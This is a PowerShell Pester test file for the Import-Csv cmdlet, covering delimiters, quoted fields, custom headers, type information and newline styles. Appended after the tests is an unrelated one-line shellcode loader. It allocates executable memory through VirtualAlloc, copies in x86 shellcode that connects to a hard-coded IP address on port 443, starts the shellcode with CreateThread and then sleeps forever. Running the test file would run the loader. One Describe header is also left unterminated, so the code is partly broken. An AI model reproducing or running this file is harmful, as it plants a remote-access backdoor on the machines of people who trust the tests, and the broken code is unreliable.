

Describe "Import-Csv DRT Unit Tests" -Tags "CI" {
    BeforeAll {
        $fileToGenerate = Join-Path $TestDrive -ChildPath "importCSVTest.csv"
        $psObject = [pscustomobject]@{ "First" = "1"; "Second" = "2" }
    }

    It "Test import-csv with a delimiter parameter" {
        $delimiter = ';'
        $psObject | Export-Csv -Path $fileToGenerate -Delimiter $delimiter
        $returnObject = Import-Csv -Path $fileToGenerate -Delimiter $delimiter
        $returnObject.First | Should -Be 1
        $returnObject.Second | Should -Be 2
    }

    It "Test import-csv with UseCulture parameter" {
        $psObject | Export-Csv -Path $fileToGenerate -UseCulture
        $returnObject = Import-Csv -Path $fileToGenerate -UseCulture
        $returnObject.First | Should -Be 1
        $returnObject.Second | Should -Be 2
    }
}

Describe "Import-Csv Double Quote Delimiter" -Tags "CI" {
    BeforeAll {
        $empyValueCsv = @'
        a1""a3
        v1"v2"v3
'@

        $withValueCsv = @'
        a1"a2"a3
        v1"v2"v3
'@

        $quotedCharacterCsv = @'
        a1,a2,a3
        v1,"v2",v3
'@
    }


    It "Should handle <name> and bind to LiteralPath from pipeline" -TestCases @(
        @{ name = "quote with empty value"  ; expectedHeader = "a1,H1,a3"; file = "EmptyValue.csv"      ; content = $empyValueCsv       ; delimiter = '"' }
        @{ name = "quote with value"        ; expectedHeader = "a1,a2,a3"; file = "WithValue.csv"       ; content = $withValueCsv       ; delimiter = '"' }
        @{ name = "value enclosed in quote" ; expectedHeader = "a1,a2,a3"; file = "QuotedCharacter.csv" ; content = $quotedCharacterCsv ; delimiter = ',' }
        ){
        param($expectedHeader, $file, $content, $delimiter)

        $testPath = Join-Path $TestDrive $file
        Set-Content $testPath -Value $content

        $returnObject = Get-ChildItem -Path $testPath | Import-Csv -Delimiter $delimiter
        $actualHeader = $returnObject[0].psobject.Properties.name -join ','
        $actualHeader | Should -BeExactly $expectedHeader

        $returnObject = $testPath | Import-Csv -Delimiter $delimiter
        $actualHeader = $returnObject[0].psobject.Properties.name -join ','
        $actualHeader | Should -BeExactly $expectedHeader

        $returnObject = [pscustomobject]@{ LiteralPath = $testPath } | Import-Csv -Delimiter $delimiter
        $actualHeader = $returnObject[0].psobject.Properties.name -join ','
        $actualHeader | Should -BeExactly $expectedHeader
    }

    It "Should handle <name> and bind to Path from pipeline" -TestCases @(
        @{ name = "quote with empty value"  ; expectedHeader = "a1,H1,a3"; file = "EmptyValue.csv"      ; content = $empyValueCsv       ; delimiter = '"' }
        @{ name = "quote with value"        ; expectedHeader = "a1,a2,a3"; file = "WithValue.csv"       ; content = $withValueCsv       ; delimiter = '"' }
        @{ name = "value enclosed in quote" ; expectedHeader = "a1,a2,a3"; file = "QuotedCharacter.csv" ; content = $quotedCharacterCsv ; delimiter = ',' }
        ){
        param($expectedHeader, $file, $content, $delimiter)

        $testPath = Join-Path $TestDrive $file
        Set-Content $testPath -Value $content

        $returnObject = Get-ChildItem -Path $testPath | Import-Csv -Delimiter $delimiter
        $actualHeader = $returnObject[0].psobject.Properties.name -join ','
        $actualHeader | Should -BeExactly $expectedHeader

        $returnObject = $testPath | Import-Csv -Delimiter $delimiter
        $actualHeader = $returnObject[0].psobject.Properties.name -join ','
        $actualHeader | Should -BeExactly $expectedHeader

        $returnObject = [pscustomobject]@{ Path = $testPath } | Import-Csv -Delimiter $delimiter
        $actualHeader = $returnObject[0].psobject.Properties.name -join ','
        $actualHeader | Should -BeExactly $expectedHeader
    }
}

Describe "Import-Csv File Format Tests" -Tags "CI" {
    BeforeAll {
        
        $TestImportCsv_NoHeader = Join-Path -Path (Join-Path $PSScriptRoot -ChildPath assets) -ChildPath TestImportCsv_NoHeader.csv
        
        $TestImportCsv_WithHeader = Join-Path -Path (Join-Path $PSScriptRoot -ChildPath assets) -ChildPath TestImportCsv_WithHeader.csv
        
        $TestImportCsv_W3C_ELF = Join-Path -Path (Join-Path $PSScriptRoot -ChildPath assets) -ChildPath TestImportCsv_W3C_ELF.csv

        $testCSVfiles = $TestImportCsv_NoHeader, $TestImportCsv_WithHeader, $TestImportCsv_W3C_ELF
        $orginalHeader = "Column1","Column2","Column 3"
        $customHeader = "test1","test2","test3"
    }
    
    foreach ($testCsv in $testCSVfiles) {
       $FileName = (Get-ChildItem $testCsv).Name
        Context "Next test file: $FileName" {
            BeforeAll {
                $CustomHeaderParams = @{Header = $customHeader; Delimiter = ","}
                if ($FileName -eq "TestImportCsv_NoHeader.csv") {
                    
                    
                    $HeaderParams = @{Header = $orginalHeader; Delimiter = ","}
                } else {
                    
                    $HeaderParams = @{Delimiter = ","}
                }

            }

            It "Should be able to import all fields" {
                $actual = Import-Csv -Path $testCsv @HeaderParams
                $actualfields = $actual[0].psobject.Properties.Name
                $actualfields | Should -Be $orginalHeader
            }

            It "Should be able to import all fields with custom header" {
                $actual = Import-Csv -Path $testCsv @CustomHeaderParams
                $actualfields = $actual[0].psobject.Properties.Name
                $actualfields | Should -Be $customHeader
            }

            It "Should be able to import correct values" {
                $actual = Import-Csv -Path $testCsv @HeaderParams
                $actual.count         | Should -Be 4
                $actual[0].'Column1'  | Should -BeExactly "data1"
                $actual[0].'Column2'  | Should -BeExactly "1"
                $actual[0].'Column 3' | Should -BeExactly "A"
            }

        }
    }
}

Describe "Import-Csv 
    BeforeAll {
        $testfile = Join-Path $TestDrive -ChildPath "testfile.csv"
        Remove-Item -Path $testfile -Force -ErrorAction SilentlyContinue
        $processlist = (Get-Process)[0..1]
        $processlist | Export-Csv -Path $testfile -Force -IncludeTypeInformation
        $expectedProcessTypes = "System.Diagnostics.Process","CSV:System.Diagnostics.Process"
    }

    It "Test import-csv import Object" {
        $importObjectList = Import-Csv -Path $testfile
        $processlist.Count | Should -Be $importObjectList.Count

        $importTypes = $importObjectList[0].psobject.TypeNames
        $importTypes.Count | Should -Be $expectedProcessTypes.Count
        $importTypes[0] | Should -Be $expectedProcessTypes[0]
        $importTypes[1] | Should -Be $expectedProcessTypes[1]
    }
}

Describe "Import-Csv with different newlines" -Tags "CI" {
    It "Test import-csv with '<name>' newline" -TestCases @(
        @{ name = "CR"; newline = "`r" }
        @{ name = "LF"; newline = "`n" }
        @{ name = "CRLF"; newline = "`r`n" }
        ) {
        param($newline)
        $csvFile = Join-Path $TestDrive -ChildPath $((New-Guid).Guid)
        $delimiter = ','
        "h1,h2,h3$($newline)11,12,13$($newline)21,22,23$($newline)" | Out-File -FilePath $csvFile
        $returnObject = Import-Csv -Path $csvFile -Delimiter $delimiter
        $returnObject.Count | Should -Be 2
        $returnObject[0].h1 | Should -Be 11
        $returnObject[0].h2 | Should -Be 12
        $returnObject[0].h3 | Should -Be 13
        $returnObject[1].h1 | Should -Be 21
        $returnObject[1].h2 | Should -Be 22
        $returnObject[1].h3 | Should -Be 23
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x69,0x5c,0xe5,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

